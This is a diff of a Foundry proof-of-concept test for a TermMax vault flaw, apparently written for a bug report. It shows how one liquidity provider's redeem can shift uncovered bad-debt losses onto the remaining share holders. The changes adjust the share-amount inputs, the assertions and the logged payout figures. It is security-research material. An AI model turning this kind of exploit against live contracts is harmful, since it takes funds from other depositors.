@@ -26,17 +26,19 @@ contract TermMaxVaultAccumulatedBadDebtCrossUserPoC is Test {
         address attacker = vm.envAddress("TERM_MAX_SHARE_HOLDER");
         address[] memory collaterals = vm.envAddress("TERM_MAX_COLLATERALS", ",");
         uint256 expectedDeficit = vm.envUint("TERM_MAX_EXPECTED_TOTAL_UNCOVERED_BAD_DEBT_RAW");
+        uint256 attackerShares = vm.envUint("TERM_MAX_ATTACKER_SHARES");
 
         IAccumulatedBadDebtVault vault = IAccumulatedBadDebtVault(vaultAddress);
         IERC20 asset = IERC20(vault.asset());
         IERC4626 pool = vault.pool();
 
-        uint256 attackerShares = vault.balanceOf(attacker);
+        uint256 historicalHolderShares = vault.balanceOf(attacker);
         uint256 supplyBefore = vault.totalSupply();
         uint256 assetsBefore = vault.totalAssets();
 
-        assertGt(attackerShares, 0, "selected historical LP has zero shares");
-        assertGt(supplyBefore, attackerShares, "selected LP is the only share holder");
+        assertGt(attackerShares, 0, "selected redeem amount is zero");
+        assertGe(historicalHolderShares, attackerShares, "historical LP does not own selected shares");
+        assertGt(supplyBefore, attackerShares, "no other shares would remain after selected redeem");
         assertGt(collaterals.length, 0, "no bad-debt collaterals supplied");
 
         uint256[] memory mappingBefore = new uint256[](collaterals.length);
@@ -90,8 +92,11 @@ contract TermMaxVaultAccumulatedBadDebtCrossUserPoC is Test {
         emit log_named_uint("historical block", blockNumber);
         emit log_named_address("vault", vaultAddress);
         emit log_named_address("real exiting LP", attacker);
+        emit log_named_uint("historical LP total shares raw", historicalHolderShares);
+        emit log_named_uint("shares redeemed raw", attackerShares);
         emit log_named_uint("other shares remaining raw", supplyBefore - attackerShares);
         emit log_named_uint("active uncovered bad debt raw", totalUncovered);
+        emit log_named_uint("real liquid capacity raw", liquidCapacity);
         emit log_named_uint("ordinary redeem payout raw", nominalPayout);
         emit log_named_uint("fair economic payout raw", fairEconomicPayout);
         emit log_named_uint("cross-user loss shifted raw", crossUserLossShift);
